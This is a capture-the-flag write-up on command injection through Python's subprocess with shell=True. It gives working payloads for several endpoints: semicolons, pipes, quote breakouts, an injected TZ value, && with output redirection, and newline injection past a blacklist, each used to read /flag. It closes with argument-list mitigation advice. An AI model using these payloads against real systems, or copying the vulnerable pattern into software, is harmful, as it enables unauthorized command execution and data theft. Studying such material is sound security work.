# Command Injection via `shell=True`

## Overview

The app exposes an `/api/browse` endpoint that takes a `dir` parameter and uses it to list a directory. The goal was to run an extra command and read the flag.

## Vulnerable Code

```python
arg = flask.request.args.get("dir", "/data")
command = f"ls -l {arg}"

subprocess.run(
    command,
    shell=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
)
```

User input is inserted directly into a string that is run by a shell (`shell=True`), so shell metacharacters are interpreted.

## Exploitation

A normal request:

```
/api/browse?dir=/tmp
```

runs:

```
ls -l /tmp
```

Injecting a semicolon:

```
/api/browse?dir=;cat /flag
```

produces:

```
ls -l ;cat /flag
```

The `;` ends the first command and starts a second one, so the shell runs both `ls -l` and `cat /flag`. The response contained the flag.

## Bypassing the `;` Restriction

The challenge blocked the `;` character to prevent the previous command-injection technique. However, the shell supports other command operators. Using the pipe operator `|`, I was able to inject another command without relying on `;`, demonstrating why filtering a single shell character is not an effective defense against command injection.

Request:

```
/api/browse?dir=/tmp | cat /flag
```

Resulting command:

```
ls -l /tmp | cat /flag
```

`|` pipes the output of `ls -l /tmp` into `cat /flag` — but `cat /flag` still runs and prints the flag's contents to stdout, which is captured and returned in the response.

## Bypassing Single-Quote Filtering

The application placed the user input inside single quotes:

```python
command = f"ls -l '{arg}'"
```

I bypassed this by injecting a single quote to escape the quoted context, followed by a command separator and `cat /flag`. The resulting command allowed the shell to execute `cat /flag` and disclose the flag.

Request:

```
/api/browse?dir='|cat /flag|'
```

Resulting command:

```
ls -l ''|cat /flag|''
```

The leading `'` closes the quote the app added, `|cat /flag|` runs as its own piped command, and the trailing `'` reopens a (now-empty) quoted string so the overall command stays syntactically valid.

This demonstrated that wrapping untrusted input in quotes is not sufficient protection when `shell=True` is used.

## Command Injection via `TZ`

A separate endpoint constructed its command using user-controlled input intended as an environment-variable value:

```python
arg = flask.request.args.get("zone", "MST")
command = f"TZ={arg} date"
```

Because this was also run with `shell=True`, I could inject shell syntax into the `zone` parameter.

Request:

```
/api/clock?zone=whoami;cat+/flag
```

Resulting command:

```
TZ=whoami;cat /flag date
```

The `;` terminated the `TZ=whoami` portion and let `cat /flag` run as a separate shell command. The output was captured by the application and returned in the response, revealing the flag.

This demonstrates that even when user input appears to be intended only as an environment-variable value, directly inserting it into a shell command with `shell=True` can lead to command injection.

## Command Injection with File Redirection

Another endpoint, `/api/create`, takes a `filename` parameter and constructs the command:

```python
arg = flask.request.args.get("filename", "notes.txt")
command = f"touch {arg}"
```

and executes it with `shell=True`. The page displays the generated command but not the command's stdout, so directly injecting `cat /flag` did not reveal the flag in the web response.

Instead I used `&&` with output redirection:

Request:

```
/api/create?filename=notes.txt && cat /flag > /data/notes.txt
```

Resulting command:

```
touch notes.txt && cat /flag > /data/notes.txt
```

The `&&` runs the second command after `touch` succeeds, and `>` redirects the output of `cat /flag` into `/data/notes.txt`. I then accessed `/data/notes.txt` directly to retrieve the flag.

This demonstrated that command injection doesn't always require the injected command's output to be returned directly — file creation and output redirection can be used as an alternative way to retrieve command output.

## Bypassing the Character Blacklist with Newline Injection

Another endpoint attempted to prevent command injection by stripping common shell metacharacters such as `;`, `&`, `|`, `>`, `<`, `` ` ``, and `$`. However, newline characters were not filtered.

I used the URL-encoded newline `%0A` to inject a second command:

Request:

```
/api/explore?path=/data%0Acat%20/flag
```

Resulting command:

```
ls -l /data
cat /flag
```

The newline acted as a command separator, letting `cat /flag` execute despite the blacklist.

This demonstrates why blacklisting individual shell characters is not a reliable defense against command injection. The proper mitigation is to avoid `shell=True` and pass user input as a separate argument.

## Root Cause

Untrusted input was concatenated into a shell command.

```
User input -> dir -> f"ls -l {arg}" -> shell=True -> injected command runs
```

## Mitigation

Don't build shell commands from user input. Pass an argument list instead:

```python
subprocess.run(["ls", "-l", "--", arg])
```

Without a shell, `;`, `&&`, and `|` are just characters in a filename. The `--` stops `arg` from being parsed as an option (e.g. `-R`). Ideally, also validate `arg` against an allowed base directory.

Example: with `arg = ";cat /flag"`, the fixed code runs `ls -l -- ';cat /flag'` as a single literal argument — `ls` reports there's no such file/directory, and no second command is ever executed.

## Takeaway

User input + string-built command + `shell=True` = OS command injection. When reviewing Python code, trace user-controlled data into `subprocess`, `os.system()`, `os.popen()`, and `eval()`/`exec()`, especially with `shell=True`.